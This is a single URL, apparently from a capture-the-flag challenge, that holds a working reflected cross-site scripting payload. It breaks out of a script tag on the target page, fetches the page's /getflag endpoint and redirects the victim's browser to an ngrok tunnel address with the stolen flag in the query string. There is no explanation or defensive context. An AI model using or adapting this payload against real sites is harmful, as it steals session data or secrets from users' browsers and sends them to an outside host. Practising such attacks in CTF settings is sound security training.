http://h4ck3r.quest:8800/?message=</script>
<script>fetch(`/getflag`)
.then(r=>r.text())
.then(flag=>location.href=`http://c5ce-140-118-126-223.ngrok.io?${flag}`)//
